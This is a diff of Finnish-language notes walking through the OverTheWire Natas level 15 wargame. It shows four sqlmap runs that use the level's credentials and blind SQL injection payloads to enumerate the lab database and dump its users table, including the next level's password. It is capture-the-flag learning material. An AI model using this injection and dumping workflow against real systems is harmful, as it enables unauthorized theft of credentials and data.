@@ -1119,7 +1119,7 @@ Table: users
 
 ---
 
-# Natas 15 - miten oltais virallisesti menty?
+# Natas 15 - miten oltais virallisesti menty? - 1
 
 🔍 Tietokannan taulut
 🔍 Sarakkeet halutusta taulusta
@@ -1320,11 +1320,305 @@ Table: users
 [*] ending @ 13:00:10 /2025-05-18/
 ```
 
+# Natas 15 - miten oltais virallisesti menty? - 2
+## TOINEN VAIHTOEHTO - TOINEN TAPA
+
+Tämäkin oltaisi voitu mennä toisella tavalla, mutta ideana on sama kuin ykkönen (aikaisempi kappele), ja tätä sqlmap komentoa on menty toisessa harjoituksessa, mutta tämä *natas* harjoitusmoduuli on vähä vaikeampi. Toinen harjoitus sivusto, mutta ikään toisenlainen tapa `http://testphp.vulnweb.com/artists.php` <br><br>
+
+
+SQLMap komento mitä halutaan hakea (URL), sitten autentikointi, ja jne, että mikä data, stringit ja `--dbs` eli tarkistettaan **database** 
+Tässä tuloksena kuitenkin antoi meille että löytyi saatavilla 3kpl tietokantaa (alhaalla) ja meitä kiinnostaa toi `natas15`.
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" \
+--auth-type Basic \
+--auth-cred natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
+--data "username=natas16" \
+--string "This user exists" \
+--dbs
+
+        ___
+       __H__                                                                                                                              
+ ___ ___[)]_____ ___ ___  {1.8.5#stable}                                                                                                  
+|_ -| . [.]     | .'| . |                                                                                                                 
+|___|_  [']_|_|_|__,|  _|                                                                                                                 
+      |_|V...       |_|   https://sqlmap.org                                                                                              
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:48:29 /2025-05-18/
+
+[14:48:29] [INFO] resuming back-end DBMS 'mysql' 
+[14:48:29] [INFO] testing connection to the target URL
+[14:48:30] [INFO] testing if the provided string is within the target URL page content
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=natas16" AND 1660=1660-- PPEC
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=natas16" AND (SELECT 2128 FROM (SELECT(SLEEP(5)))AGpI)-- cjDo
+---
+[14:48:30] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL < 5.0.12
+[14:48:30] [INFO] fetching database names
+[14:48:30] [INFO] fetching number of databases
+[14:48:30] [INFO] resumed: 3
+[14:48:30] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[14:48:30] [INFO] retrieved: 
+[14:48:30] [WARNING] reflective value(s) found and filtering out
+information_schema
+[14:48:36] [INFO] retrieved: performance_schema
+[14:48:42] [INFO] retrieved: natas15
+available databases [3]:
+[*] information_schema
+[*] natas15
+[*] performance_schema
+
+[14:48:44] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'
+[14:48:44] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 14:48:44 /2025-05-18/
+```
+
+Seuraavaksi: <br>
+Tässä mennään tohon tietokannan `natas15` sisälle , tarkistettaan tables (taulu), ja jos lyhenteenä menisi `-T`
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" \
+--auth-type Basic \
+--auth-cred natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
+--data "username=natas16" \
+--string "This user exists" \
+-D natas15 --tables
+        ___
+       __H__                                                                                                                              
+ ___ ___[)]_____ ___ ___  {1.8.5#stable}                                                                                                  
+|_ -| . [.]     | .'| . |                                                                                                                 
+|___|_  [,]_|_|_|__,|  _|                                                                                                                 
+      |_|V...       |_|   https://sqlmap.org                                                                                              
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:55:08 /2025-05-18/
+
+[14:55:09] [INFO] resuming back-end DBMS 'mysql' 
+[14:55:09] [INFO] testing connection to the target URL
+[14:55:09] [INFO] testing if the provided string is within the target URL page content
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=natas16" AND 1660=1660-- PPEC
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=natas16" AND (SELECT 2128 FROM (SELECT(SLEEP(5)))AGpI)-- cjDo
+---
+[14:55:09] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL < 5.0.12
+[14:55:09] [INFO] fetching tables for database: 'natas15'
+[14:55:09] [INFO] fetching number of tables for database 'natas15'
+[14:55:09] [INFO] resumed: 1
+[14:55:09] [INFO] resumed: users
+Database: natas15
+[1 table]
++-------+
+| users |
++-------+
+
+[14:55:09] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'
+[14:55:09] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 14:55:09 /2025-05-18/
+```
+
+Seuraavaksi: <br><br>
+Nyt tässä sama kuin ylempi, mutta kokoajan mennään syvemmäksi tähän tietokantaan -D (database), --tables (taulukko), users --columns (sarake)
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" \
+--auth-type Basic \
+--auth-cred natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
+--data "username=natas16" \
+--string "This user exists" \
+-D natas15 --tables users --columns
+        ___
+       __H__                                                                                                                              
+ ___ ___[.]_____ ___ ___  {1.8.5#stable}                                                                                                  
+|_ -| . [)]     | .'| . |                                                                                                                 
+|___|_  [.]_|_|_|__,|  _|                                                                                                                 
+      |_|V...       |_|   https://sqlmap.org                                                                                              
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:55:48 /2025-05-18/
+
+[14:55:48] [INFO] resuming back-end DBMS 'mysql' 
+[14:55:48] [INFO] testing connection to the target URL
+[14:55:48] [INFO] testing if the provided string is within the target URL page content
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=natas16" AND 1660=1660-- PPEC
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=natas16" AND (SELECT 2128 FROM (SELECT(SLEEP(5)))AGpI)-- cjDo
+---
+[14:55:48] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL < 5.0.12
+[14:55:48] [INFO] fetching tables for database: 'natas15'
+[14:55:48] [INFO] fetching number of tables for database 'natas15'
+[14:55:48] [INFO] resumed: 1
+[14:55:48] [INFO] resumed: users
+Database: natas15
+[1 table]
++-------+
+| users |
++-------+
+
+[14:55:48] [INFO] fetching columns for table 'users' in database 'natas15'
+[14:55:48] [INFO] resumed: 2
+[14:55:48] [INFO] resumed: username
+[14:55:48] [INFO] resumed: varchar(64)
+[14:55:48] [INFO] resumed: password
+[14:55:48] [INFO] resumed: varchar(64)
+Database: natas15
+Table: users
+[2 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| password | varchar(64) |
+| username | varchar(64) |
++----------+-------------+
+
+[14:55:48] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'
+[14:55:48] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 14:55:48 /2025-05-18/
+```
+
+
+Viimeisenä: <br>
+Tässä nyt päästään dumppaa (tulostaa) se mitä halutaan hakea just tämän `username` sarakkeesta ulos.
+Eli kertauksena: -D (database) natas15 , --tables (taulukko) users, --column (sarake) username, --dump (dumppataan ulos sitä dataa)
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" \
+--auth-type Basic \
+--auth-cred natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx \
+--data "username=natas16" \
+--string "This user exists" \
+-D natas15 --tables users --columns username --dump
+        ___
+       __H__                                                                                                                              
+ ___ ___["]_____ ___ ___  {1.8.5#stable}                                                                                                  
+|_ -| . [(]     | .'| . |                                                                                                                 
+|___|_  [']_|_|_|__,|  _|                                                                                                                 
+      |_|V...       |_|   https://sqlmap.org                                                                                              
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:56:21 /2025-05-18/
+
+[14:56:22] [INFO] resuming back-end DBMS 'mysql' 
+[14:56:22] [INFO] testing connection to the target URL
+[14:56:22] [INFO] testing if the provided string is within the target URL page content
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: username=natas16" AND 1660=1660-- PPEC
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=natas16" AND (SELECT 2128 FROM (SELECT(SLEEP(5)))AGpI)-- cjDo
+---
+[14:56:22] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL < 5.0.12
+[14:56:22] [INFO] fetching tables for database: 'natas15'
+[14:56:22] [INFO] fetching number of tables for database 'natas15'
+[14:56:22] [INFO] resumed: 1
+[14:56:22] [INFO] resumed: users
+Database: natas15
+[1 table]
++-------+
+| users |
++-------+
+
+[14:56:22] [INFO] fetching columns for table 'users' in database 'natas15'
+[14:56:22] [INFO] resumed: 2
+[14:56:22] [INFO] resumed: username
+[14:56:22] [INFO] resumed: varchar(64)
+[14:56:22] [INFO] resumed: password
+[14:56:22] [INFO] resumed: varchar(64)
+Database: natas15
+Table: users
+[2 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| password | varchar(64) |
+| username | varchar(64) |
++----------+-------------+
+
+[14:56:22] [INFO] fetching columns for table 'users' in database 'natas15'
+[14:56:22] [INFO] resumed: 2
+[14:56:22] [INFO] resumed: username
+[14:56:22] [INFO] resumed: password
+[14:56:22] [INFO] fetching entries for table 'users' in database 'natas15'
+[14:56:22] [INFO] fetching number of entries for table 'users' in database 'natas15'
+[14:56:22] [INFO] resumed: 4
+[14:56:22] [INFO] resumed: 6P151OntQe
+[14:56:22] [INFO] resumed: bob
+[14:56:22] [INFO] resumed: HLwuGKts2w
+[14:56:22] [INFO] resumed: charlie
+[14:56:22] [INFO] resumed: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+[14:56:22] [INFO] resumed: natas16
+[14:56:22] [INFO] resumed: hROtsfM734
+[14:56:22] [INFO] resumed: alice
+Database: natas15
+Table: users
+[4 entries]
++----------------------------------+----------+
+| password                         | username |
++----------------------------------+----------+
+| 6P151OntQe                       | bob      |
+| HLwuGKts2w                       | charlie  |
+| hPkjKYviLQctEW33QmuXL6eDVfMW4sGo | natas16  |
+| hROtsfM734                       | alice    |
++----------------------------------+----------+
+
+[14:56:22] [INFO] table 'natas15.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org/dump/natas15/users.csv'                                                                                                                        
+[14:56:22] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas15.natas.labs.overthewire.org'
+[14:56:22] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 14:56:22 /2025-05-18/
+```
+
+---
 ---
 
-# Koskien tätä Level 15 - tietokannan selvitystä
+# Koskien tätä Level 15 - tietokannan selvitystä - START HERE
 
-Eli tästä levelistä kuinka oltaisi menty selvittää ja ratkaisee. Perus siinä `index-source.html` välilehdessä kerrottiin pieni vihjeenä että siinä on rakennettu **taulukko** joka on nimetty `users` eli (alempi table luominen), ja tässä antoi vihjeenä että taulun sisällössä on **sarakkeet**: `username` ja `password`.
+Eli tästä levelistä kuinka oltaisi menty selvittää ja ratkaisee, perus tasot menee vaikeaksi ja vaikeammaksi. Perus siinä `index-source.html` välilehdessä kerrottiin pieni vihjeenä että siinä on rakennettu **taulukko** joka on nimetty `users` eli (alempi table luominen), ja tässä antoi vihjeenä että taulun sisällössä on **sarakkeet**: `username` ja `password`.
 
 
 ```
